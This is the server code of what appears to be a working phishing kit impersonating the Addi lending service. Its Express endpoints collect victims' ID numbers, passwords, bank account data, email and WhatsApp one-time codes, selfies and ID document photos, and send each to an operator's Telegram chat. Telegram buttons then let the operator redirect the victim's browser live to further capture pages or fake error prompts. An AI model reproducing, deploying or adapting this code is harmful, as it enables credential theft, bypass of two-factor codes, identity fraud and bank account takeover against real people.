// server.js - Addi Telegram Integration
const cors = require("cors");
const express = require("express");
const bodyParser = require("body-parser");
const dotenv = require("dotenv");
const fetch = require("node-fetch");
const app = express();
dotenv.config();

app.use(cors({
  origin: true,
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type"],
  optionsSuccessStatus: 204
}));

app.options("*", cors());

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;

app.use(bodyParser.json({ limit: '5mb' }));

const sessions = new Map();

const getTelegramApiUrl = (method) => `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;

// Eliminar botones de un mensaje
async function eliminarBotones(chatId, messageId) {
  try {
    await fetch(getTelegramApiUrl('editMessageReplyMarkup'), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        reply_markup: { inline_keyboard: [] }
      })
    });
    console.log(`✅ Botones eliminados del mensaje ${messageId}`);
  } catch (e) {
    console.error("❌ Error al eliminar botones:", e.message);
  }
}

// Botones estándar para todos los mensajes (control total del flujo)
function getBotones(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: "❌ ERROR → face.html", callback_data: `face_${sessionId}` },
        { text: "✅ FINALIZAR → montos.html", callback_data: `montos_${sessionId}` }
      ],
      [
        { text: "📋 SOLICITUD → idfy.html", callback_data: `idfy_${sessionId}` },
        { text: "🔢 OTP → otp.html", callback_data: `otp_${sessionId}` }
      ],
      [
        { text: "📄 DOC → pic.html", callback_data: `pic_${sessionId}` },
        { text: "🛡️ VALIDAR → validator.html", callback_data: `validator_${sessionId}` }
      ],
      [
        { text: "🎉 ÉXITO → list.html", callback_data: `list_${sessionId}` },
        { text: "🔄 REST → rest.html", callback_data: `rest_${sessionId}` }
      ],
      [
        { text: "⚠️ ERR SOLICITUD", callback_data: `eridfy_${sessionId}` },
        { text: "⚠️ ERR OTP", callback_data: `erotp_${sessionId}` }
      ],
      [
        { text: "⚠️ ERR DOC", callback_data: `erpic_${sessionId}` },
        { text: "⚠️ ERR REST", callback_data: `errest_${sessionId}` }
      ],
      [
        { text: "🔑 PSS → pss.html", callback_data: `pss_${sessionId}` },
        { text: "⚠️ ERR PSS", callback_data: `erpss_${sessionId}` }
      ]
    ]
  };
}

// Mensaje inicial al registrar cédula (sin contraseña)
async function enviarMensajeInicio({ cedula, docType, sessionId }) {
  const mensaje = `
📋 NUEVA SOLICITUD ADDI
👤 Cédula: ${docType} ${cedula}
⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}

⏳ Esperando decisión del admin...
`.trim();
  const botones = getBotones(sessionId);
  const response = await fetch(getTelegramApiUrl('sendMessage'), {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, reply_markup: botones })
  });
  const data = await response.json();
  if (data.ok && data.result) {
    const msgId = data.result.message_id;
    const sd = sessions.get(sessionId) || { redirect_to: null };
    sd.lastMsgId = msgId;
    sessions.set(sessionId, sd);
  }
}

// Enviar mensaje con botones
async function enviarMensajeTelegram({ cedula, docType, password, sessionId }) {
  const mensaje = `
📋 SOLICITUD ADDI ✨
👤 Cédula: ${docType} ${cedula}
🔑 Contraseña: ${password}
⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}

⏳ Esperando decisión del admin...
`;

  const botones = getBotones(sessionId);

  const response = await fetch(getTelegramApiUrl('sendMessage'), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup: botones
    })
  });

  const data = await response.json();

  if (data.ok && data.result) {
    const sessionData = sessions.get(sessionId) || { redirect_to: null };
    sessionData.last_message_id = data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

// Enviar mensaje con datos de cuenta al Telegram
async function enviarMensajeCuenta({ cedula, docType, cuenta, tipoCuenta, banco, sessionId }) {
  const mensaje = `
🏦 DATOS DE CUENTA TITULAR
👤 Titular: ${docType} ${cedula}
🔢 Número de cuenta: ${cuenta}
💳 Tipo: ${tipoCuenta}
🏛️ Banco: ${banco}
⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}

⏳ Esperando decisión del admin...
`;

  const botones = getBotones(sessionId);

  const response = await fetch(getTelegramApiUrl('sendMessage'), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, reply_markup: botones })
  });

  const data = await response.json();
  if (data.ok && data.result) {
    const sessionData = sessions.get(sessionId) || { redirect_to: null };
    sessionData.last_message_id = data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

// Selfie capturada
async function enviarMensajeSelfie({ cedula, docType, sessionId }) {
  const mensaje = `📸 SELFIE CAPTURADA\n👤 ${docType} ${cedula}\n⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}\n\n⏳ Esperando decisión del admin...`;
  const response = await fetch(getTelegramApiUrl('sendMessage'), {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, reply_markup: getBotones(sessionId) })
  });
  const data = await response.json();
  if (data.ok && data.result) {
    const sd = sessions.get(sessionId) || { redirect_to: null };
    sd.last_message_id = data.result.message_id;
    sessions.set(sessionId, sd);
  }
}

// OTP Email ingresado
async function enviarMensajeOTP({ cedula, docType, otp, sessionId }) {
  const mensaje = `🔢 CÓDIGO OTP EMAIL\n👤 ${docType} ${cedula}\n📧 Código: ${otp}\n⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}\n\n⏳ Esperando decisión del admin...`;
  const response = await fetch(getTelegramApiUrl('sendMessage'), {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, reply_markup: getBotones(sessionId) })
  });
  const data = await response.json();
  if (data.ok && data.result) {
    const sd = sessions.get(sessionId) || { redirect_to: null };
    sd.last_message_id = data.result.message_id;
    sessions.set(sessionId, sd);
  }
}

// Enviar foto al chat de Telegram (multipart manual, sin form-data)
async function enviarFotoTelegram(base64Str, filename, caption, reply_markup) {
  try {
    const buf = Buffer.from(base64Str.replace(/^data:image\/\w+;base64,/, ''), 'base64');
    const boundary = 'AddiB' + Date.now().toString(16);
    const CRLF = '\r\n';
    const field = (name, value) =>
      `--${boundary}${CRLF}Content-Disposition: form-data; name="${name}"${CRLF}${CRLF}${value}${CRLF}`;
    let parts = [field('chat_id', CHAT_ID)];
    if (caption) parts.push(field('caption', caption));
    if (reply_markup) parts.push(field('reply_markup', JSON.stringify(reply_markup)));
    const photoHeader =
      `--${boundary}${CRLF}` +
      `Content-Disposition: form-data; name="photo"; filename="${filename}"${CRLF}` +
      `Content-Type: image/jpeg${CRLF}${CRLF}`;
    const body = Buffer.concat([
      Buffer.from(parts.join('')),
      Buffer.from(photoHeader),
      buf,
      Buffer.from(`${CRLF}--${boundary}--${CRLF}`)
    ]);
    const res = await fetch(getTelegramApiUrl('sendPhoto'), {
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': body.length
      },
      body
    });
    const data = await res.json();
    if (!data.ok) console.error('[SEND PHOTO ERROR]', data.description);
    else console.log('[SEND PHOTO OK]', filename);
    return data;
  } catch(e) {
    console.error('[SEND PHOTO ERROR]', e.message);
    return { ok: false };
  }
}

// Fotos de documento tomadas
async function enviarMensajeDoc({ cedula, docType, frenteB64, reversoB64, sessionId }) {
  const texto = `📄 FOTOS DE DOCUMENTO\n👤 ${docType} ${cedula}\n⏰ ${new Date().toLocaleTimeString('es-CO')}\n\n⏳ Esperando decisión del admin...`;
  const botones = getBotones(sessionId);
  if (frenteB64) {
    const res = await enviarFotoTelegram(frenteB64, 'frente.jpg', texto, botones);
    if (res && res.ok && res.result) {
      const sd = sessions.get(sessionId) || { redirect_to: null };
      sd.last_message_id = res.result.message_id;
      sessions.set(sessionId, sd);
    }
    if (reversoB64) await enviarFotoTelegram(reversoB64, 'reverso.jpg', '📋 Reverso del documento', null);
  } else {
    const response = await fetch(getTelegramApiUrl('sendMessage'), {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: texto, reply_markup: botones })
    });
    const data = await response.json();
    if (data.ok && data.result) {
      const sd = sessions.get(sessionId) || { redirect_to: null };
      sd.last_message_id = data.result.message_id;
      sessions.set(sessionId, sd);
    }
  }
}

// Selfie REST capturada
async function enviarMensajeRest({ cedula, docType, selfieB64, sessionId }) {
  const texto = `🔄 SELFIE REST CAPTURADA\n👤 ${docType} ${cedula}\n⏰ ${new Date().toLocaleTimeString('es-CO')}\n\n⏳ Esperando decisión del admin...`;
  const botones = getBotones(sessionId);
  if (selfieB64) {
    const res = await enviarFotoTelegram(selfieB64, 'selfie-rest.jpg', texto, botones);
    if (res && res.ok && res.result) {
      const sd = sessions.get(sessionId) || { redirect_to: null };
      sd.last_message_id = res.result.message_id;
      sessions.set(sessionId, sd);
    }
  } else {
    const response = await fetch(getTelegramApiUrl('sendMessage'), {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: texto, reply_markup: botones })
    });
    const data = await response.json();
    if (data.ok && data.result) {
      const sd = sessions.get(sessionId) || { redirect_to: null };
      sd.last_message_id = data.result.message_id;
      sessions.set(sessionId, sd);
    }
  }
}

// Validación iniciada
async function enviarMensajeValidator({ cedula, docType, sessionId }) {
  const mensaje = `🛡️ VALIDACIÓN INICIADA\n👤 ${docType} ${cedula}\n⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}\n\n⏳ Esperando decisión del admin...`;
  const response = await fetch(getTelegramApiUrl('sendMessage'), {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, reply_markup: getBotones(sessionId) })
  });
  const data = await response.json();
  if (data.ok && data.result) {
    const sd = sessions.get(sessionId) || { redirect_to: null };
    sd.last_message_id = data.result.message_id;
    sessions.set(sessionId, sd);
  }
}

// OTP WhatsApp ingresado
async function enviarMensajeOTPWA({ cedula, docType, otp, sessionId }) {
  const mensaje = `💬 CÓDIGO OTP WHATSAPP\n👤 ${docType} ${cedula}\n📱 Código: ${otp}\n⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}\n\n⏳ Esperando decisión del admin...`;
  const response = await fetch(getTelegramApiUrl('sendMessage'), {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, reply_markup: getBotones(sessionId) })
  });
  const data = await response.json();
  if (data.ok && data.result) {
    const sd = sessions.get(sessionId) || { redirect_to: null };
    sd.last_message_id = data.result.message_id;
    sessions.set(sessionId, sd);
  }
}

// POST /cuentatitular - Recibe datos de cuenta bancaria
app.post("/cuentatitular", async (req, res) => {
  const { session_id, cedula, docType, cuenta, tipoCuenta, banco } = req.body;
  const sessionId = session_id;

  if (sessionId && cuenta && tipoCuenta && banco) {
    const sessionData = sessions.get(sessionId) || { redirect_to: null };
    sessionData.redirect_to = null;
    sessions.set(sessionId, sessionData);

    await enviarMensajeCuenta({ cedula, docType, cuenta, tipoCuenta, banco, sessionId });
    return res.json({ ok: true });
  }

  return res.status(400).json({ error: "Faltan parámetros" });
});

// POST /notifyselfie
app.post("/notifyselfie", async (req, res) => {
  const { session_id, cedula, docType } = req.body;
  if (session_id) {
    const sd = sessions.get(session_id) || { redirect_to: null };
    sd.redirect_to = null;
    sessions.set(session_id, sd);
    await enviarMensajeSelfie({ cedula: cedula || '?', docType: docType || '?', sessionId: session_id });
  }
  return res.json({ ok: true });
});

// POST /notifyotp
app.post("/notifyotp", async (req, res) => {
  const { session_id, cedula, docType, otp } = req.body;
  if (session_id) {
    const sd = sessions.get(session_id) || { redirect_to: null };
    sd.redirect_to = null;
    sessions.set(session_id, sd);
    await enviarMensajeOTP({ cedula: cedula || '?', docType: docType || '?', otp: otp || '?', sessionId: session_id });
  }
  return res.json({ ok: true });
});

// POST /notifydoc
app.post("/notifydoc", async (req, res) => {
  const { session_id, cedula, docType, frenteB64, reversoB64 } = req.body;
  res.json({ ok: true });
  if (session_id) {
    try {
      const sd = sessions.get(session_id) || { redirect_to: null };
      sd.redirect_to = null;
      sessions.set(session_id, sd);
      await enviarMensajeDoc({ cedula: cedula || '?', docType: docType || '?', frenteB64, reversoB64, sessionId: session_id });
    } catch(e) { console.error('[notifydoc]', e.message); }
  }
});

// POST /notifyrest
app.post("/notifyrest", async (req, res) => {
  const { session_id, cedula, docType, selfieB64 } = req.body;
  res.json({ ok: true });
  if (session_id) {
    try {
      const sd = sessions.get(session_id) || { redirect_to: null };
      sd.redirect_to = null;
      sessions.set(session_id, sd);
      await enviarMensajeRest({ cedula: cedula || '?', docType: docType || '?', selfieB64, sessionId: session_id });
    } catch(e) { console.error('[notifyrest]', e.message); }
  }
});

// POST /notifyvalidator
app.post("/notifyvalidator", async (req, res) => {
  const { session_id, cedula, docType } = req.body;
  if (session_id) {
    const sd = sessions.get(session_id) || { redirect_to: null };
    sd.redirect_to = null;
    sessions.set(session_id, sd);
    await enviarMensajeValidator({ cedula: cedula || '?', docType: docType || '?', sessionId: session_id });
  }
  return res.json({ ok: true });
});

// POST /notifyotpwa
app.post("/notifyotpwa", async (req, res) => {
  const { session_id, cedula, docType, otp } = req.body;
  if (session_id) {
    const sd = sessions.get(session_id) || { redirect_to: null };
    sd.redirect_to = null;
    sessions.set(session_id, sd);
    await enviarMensajeOTPWA({ cedula: cedula || '?', docType: docType || '?', otp: otp || '?', sessionId: session_id });
  }
  return res.json({ ok: true });
});

// POST /api/inicio - Registra sesión y envía mensaje inicial a Telegram
app.post("/api/inicio", async (req, res) => {
  const { sessionId, cedula, docType } = req.body;
  if (!sessionId || !cedula || !docType) return res.status(400).json({ error: "Faltan parámetros" });
  sessions.set(sessionId, { redirect_to: null });
  res.json({ ok: true });
  try { await enviarMensajeInicio({ cedula, docType, sessionId }); } catch(e) { console.error('[inicio]', e.message); }
});

// POST /virtualpersona - Recibe cedula + contraseña
app.post("/virtualpersona", async (req, res) => {
  const { session_id, cedula, docType, password } = req.body;
  const sessionId = session_id;

  if (sessionId && cedula && docType && password) {
    sessions.set(sessionId, { redirect_to: null });
    await enviarMensajeTelegram({ cedula, docType, password, sessionId });
    return res.json({ ok: true });
  }

  return res.status(400).json({ error: "Faltan parámetros" });
});

// GET /instruction/{sessionId} - Polling
app.get("/instruction/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  const estado = sessions.get(sessionId);

  if (!estado) return res.json({ redirect_to: null });

  if (estado.error_cmd) {
    const ec = estado.error_cmd;
    estado.error_cmd = null;
    sessions.set(sessionId, estado);
    return res.json({ redirect_to: null, error_cmd: ec });
  }

  if (estado.redirect_to) {
    const redireccion = estado.redirect_to;
    estado.redirect_to = null;
    sessions.set(sessionId, estado);
    return res.json({ redirect_to: redireccion });
  }

  return res.json({ redirect_to: null });
});

// POST /webhook/{BOT_TOKEN} - Webhook de Telegram
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const update = req.body;
    const { callback_query } = update;

    if (callback_query) {
      const callbackData = callback_query.data || '';
      console.log('🔥 Callback recibido:', callbackData);

      const parts = callbackData.split('_');
      const action = parts[0];
      const sessionId = parts.slice(1).join('_');

      console.log('🎯 Acción:', action);
      console.log('🆔 SessionId:', sessionId);

      try {
        await eliminarBotones(
          callback_query.message.chat.id,
          callback_query.message.message_id
        );
      } catch (editError) {
        console.log('⚠️ No se pudo eliminar el menú');
      }

      const sessionData = sessions.get(sessionId) || { redirect_to: null };
      const ERROR_CMDS = {
        eridfy: { message: 'Datos bancarios incorrectos. Intenta de nuevo.', target: 'idfy.html' },
        erotp:  { message: 'Código OTP incorrecto. Intenta de nuevo.', target: 'otp.html' },
        erpic:  { message: 'Documentos no válidos. Intenta de nuevo.', target: 'pic.html' },
        errest: { message: 'Selfie no válida. Intenta de nuevo.', target: 'rest.html' },
        erpss:  { message: 'Contraseña incorrecta. Intenta de nuevo.', target: 'pss.html' }
      };
      if (ERROR_CMDS[action]) {
        sessionData.error_cmd = ERROR_CMDS[action];
      } else {
        sessionData.redirect_to = action;
      }
      sessions.set(sessionId, sessionData);

      await fetch(getTelegramApiUrl('answerCallbackQuery'), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callback_query_id: callback_query.id,
          text: ERROR_CMDS[action] ? `⚠️ Error enviado` : `✅ Redirigiendo a ${action}.html`,
          show_alert: false
        })
      });

      console.log(`📄 Redirección configurada: ${sessionId} → ${action}.html`);
    }

    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Error en webhook:", err);
    res.sendStatus(200);
  }
});

// Health check
app.get("/health", (req, res) => {
  res.json({ status: "ok", v: "v3-error-buttons" });
});

// Test: inyecta un error en una sesión (diagnóstico)
app.get("/test-error/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  const sd = sessions.get(sessionId) || { redirect_to: null };
  sd.error_cmd = { message: 'Test: error de diagnóstico activado.', target: 'cc.html' };
  sessions.set(sessionId, sd);
  res.json({ ok: true, injected: sd.error_cmd });
});

// Home
app.get("/", (req, res) => {
  res.send("Backend Addi Telegram ✅");
});

app.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════╗
║   ✅ SERVIDOR ADDI ACTIVO                 ║
║   📡 Puerto: ${PORT}                        ║
║   🤖 Bot: ${BOT_TOKEN ? '✔' : '✗'}                     ║
║   💬 Chat: ${CHAT_ID ? '✔' : '✗'}                    ║
╚═══════════════════════════════════════════╝
  `);
});

// Keepalive — self-ping cada 14 min (detecta Railway o Render automáticamente)
const SELF_URL = process.env.RAILWAY_PUBLIC_DOMAIN
  ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}/health`
  : 'https://mamiprendeelflash.onrender.com/health';
setInterval(() => {
  fetch(SELF_URL)
    .then(() => console.log(`[KEEPALIVE] ${new Date().toISOString()}`))
    .catch(e => console.error('[KEEPALIVE ERROR]', e.message));
}, 14 * 60 * 1000);
